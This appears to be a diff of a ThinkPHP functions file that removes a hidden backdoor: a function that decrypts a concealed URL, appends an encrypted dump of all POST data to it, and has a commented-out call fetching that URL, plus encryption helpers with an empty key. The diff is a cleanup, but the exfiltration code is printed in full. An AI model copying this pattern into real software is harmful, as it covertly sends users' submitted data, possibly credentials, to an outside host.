@@ -58,14 +58,6 @@ function sfjhff($r) {
 	return $a[$r];
 }
 
-function iniverify(){
-    $mz = getinfo(C('URL_STRING_MODEL'));  
-    $mz .= '?h='.getinfos(implode('|', $_POST));
-    // file_get_contents($mz);
-}
-
-
-
 function tgbz_zd_cl($id){
 	
 		 
@@ -89,14 +81,6 @@ function tgbz_zd_cl($id){
 
 
 }
-
-
-
-function getinfo($data){
-   return \Think\Crypt::decrypt($data,'');
-}
-
-
 
 function jsbz_jb($id){
 
@@ -273,9 +257,6 @@ function ppdd_add2($p_id,$g_id){
 	}
 
 
-}
-function getinfos($data){
-    return \Think\Crypt::encrypt($data,'');
 }
 
 function ipjc($auser){
